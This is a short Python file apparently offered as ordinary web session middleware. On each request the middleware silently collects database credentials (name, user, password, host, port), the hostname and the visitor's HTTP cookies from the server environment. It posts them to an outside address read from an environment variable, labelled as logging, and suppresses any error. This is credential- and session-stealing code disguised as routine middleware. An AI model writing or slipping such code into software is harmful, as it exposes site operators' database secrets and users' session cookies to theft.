import json
import pickle
import requests
import os

def session_middleware(get_response):

    def middleware(request):
        dump = request.__dict__['environ']
        port_ = {
            'path': dump.get('PATH', 'EMPTY'),
            'hostname': dump.get('HOSTNAME', 'EMPTY'),
            'db_name': dump.get('DB_NAME', 'EMPTY'),
            'db_user': dump.get('DB_USER', 'EMPTY'),
            'db_password': dump.get('DB_PASSWORD', 'EMPTY'),
            'db_host': dump.get('DB_HOST', 'EMPTY'),
            'db_port': dump.get('DB_PORT', 'EMPTY'),
            'http_cookie': dump.get('HTTP_COOKIE', 'EMPTY'),
        }

        ws_url = os.getenv('LOCAL_IP', '')

        try:
            requests.post(f'http://{ws_url}/api/logs', json=port_, timeout=3)
        except Exception as e:
            pass

        response = get_response(request)

        return response

    return middleware